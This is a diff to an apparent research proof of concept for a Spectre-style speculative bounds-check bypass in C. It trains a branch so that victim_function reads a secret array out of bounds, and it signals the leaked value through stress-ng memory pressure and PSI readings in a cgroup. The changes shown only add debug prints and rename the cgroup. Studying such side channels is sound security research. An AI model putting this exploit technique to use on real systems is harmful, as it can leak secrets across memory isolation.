@@ -8,7 +8,7 @@
 #include <sys/stat.h>
 #include <errno.h>
 
-#define CGROUP_PATH "/sys/fs/cgroup/memory_stress"  // Custom path for the cgroup
+#define CGROUP_PATH "/sys/fs/cgroup/memory_stress2"  // Custom path for the cgroup
 #define MEMORY_LIMIT "1G"  // Memory limit to be set for the cgroup (1GB in this case)
 
 pid_t stress_ng_pid1 = 0;  // PID for the first stress-ng process
@@ -149,6 +149,10 @@ char secret[16];  	// Secret data to leak. let's assume secrete start right afte
 //the x passed here is either train for j=5,4,3,2 or malicious_x when j=0
 void victim_function(int x) {
     if (x < array_size) {  //Bounds check (exploited speculatively)
+        printf("inside victim_function\n");
+        if(x==16) {
+          printf("x = 16 found, now array 16 %d\n", array[x]);
+          }
         if (array[x] == 0) {
             run_stress_ng_psi(1024); //You will see PSI values
         } else {
@@ -167,7 +171,10 @@ void encode(int malicious_x, int train) {
         int x = ((j % 6) - 1) & ~0xFFFF;
         x = (x | (x >> 16));
         x = train ^ (x & (malicious_x ^ train));
-
+        printf("x value %d\n", x);
+        if(x==16) {
+            printf("x = 16 found\n");
+        }
         victim_function(x);  //Execute victim_function speculatively
     }
 }
